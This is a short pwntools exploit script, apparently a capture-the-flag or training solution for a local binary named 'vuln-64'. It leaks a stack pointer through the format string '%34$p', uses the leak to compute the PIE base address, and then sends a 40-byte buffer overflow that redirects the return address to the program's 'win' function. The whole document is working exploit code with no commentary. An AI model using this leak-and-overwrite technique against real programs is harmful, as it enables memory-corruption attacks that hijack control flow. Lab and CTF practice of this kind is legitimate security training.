from pwn import *
elf = context.binary = ELF("./vuln-64")
p = process()
offset = 40
p.sendline("%34$p")
p.recvuntil(b"Nice to meet you ")
main_leak = int(p.recvline().strip().decode(),16)
main_offset = elf.sym['main']
print(main_leak)
print(main_offset)
elf.address = main_leak - main_offset
win = p64(elf.sym['win'])
payload = b"A" * offset + win + p64(0x0)
p.sendline(payload)
print(p.recvall().strip().decode())